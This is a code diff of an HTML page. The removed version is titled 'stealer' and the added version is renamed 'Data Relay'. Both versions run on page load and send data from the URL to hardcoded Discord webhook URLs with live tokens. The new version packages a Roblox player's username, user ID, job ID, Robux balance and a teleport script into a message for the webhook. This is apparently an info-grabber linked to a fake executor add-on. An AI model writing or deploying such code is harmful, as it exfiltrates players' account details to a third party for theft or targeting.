@@ -1,46 +1,64 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>stealer</title>
-    <script>
-        window.addEventListener("load", () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const jsonParam = urlParams.get("json");
-
-            if (!jsonParam) {
-                document.body.innerHTML = "<h1>error adding unc rejoin.</h1>";
-                return;
-            }
-
-            try {
-                const embedPayload = JSON.parse(decodeURIComponent(jsonParam));
-
-                const webhookUrl = "https://discord.com/api/webhooks/1334247961240010793/DQh296W26vM5-JypQ7vjipRrk7yO4z0oa7MsCpslPNeyZf_UjD_eGC7YxN0_Eki5BFnJ";
-
-                fetch(webhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(embedPayload),
-                })
-                .then(response => {
-                    if (response.ok) {
-                        document.body.innerHTML = "<h1>added all unc u can, continue using xeno</h1>";
-                    } else {
-                        document.body.innerHTML = `<h1>Error: ${response.statusText}</h1>`;
-                    }
-                })
-                .catch(error => {
-                    document.body.innerHTML = `<h1>Request failed: ${error.message}</h1>`;
-                });
-            } catch (error) {
-                document.body.innerHTML = `<h1>Invalid JSON payload: ${error.message}</h1>`;
-            }
-        });
-    </script>
+  <meta charset="UTF-8">
+  <title>Data Relay</title>
 </head>
 <body>
-    <h1>Processing...</h1>
+  <script>
+    // Helper function to extract query parameters by name.
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    // Retrieve the "data" parameter from the URL.
+    const dataParam = getQueryParam('data');
+
+    if (dataParam) {
+      try {
+        // Decode and parse the JSON data from the query parameter.
+        const jsonData = JSON.parse(decodeURIComponent(dataParam));
+        console.log("Received data:", jsonData);
+
+        // Prepare the payload for the webhook.
+        const payload = {
+          content: "Player Info Received",
+          embeds: [{
+            title: "Player Info",
+            fields: [
+              { name: "Username", value: jsonData.username || "N/A", inline: true },
+              { name: "UserID", value: jsonData.userId || "N/A", inline: true },
+              { name: "JobID", value: jsonData.jobId || "N/A", inline: true },
+              { name: "Robux", value: jsonData.robuxAmount || "N/A", inline: true },
+              { name: "Teleport Script", value: jsonData.teleportScript || "N/A", inline: false }
+            ],
+            thumbnail: { url: jsonData.headshotUrl || "" }
+          }]
+        };
+
+        // Send the payload to the webhook.
+        fetch('https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU', {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log("Data sent successfully to webhook.");
+          } else {
+            console.error("Failed to send data to webhook. Status:", response.status);
+          }
+        })
+        .catch(error => {
+          console.error("Error sending data to webhook:", error);
+        });
+      } catch (error) {
+        console.error("Error parsing JSON data from URL:", error);
+      }
+    } else {
+      console.log("No 'data' parameter found in URL.");
+    }
+  </script>
 </body>
 </html>
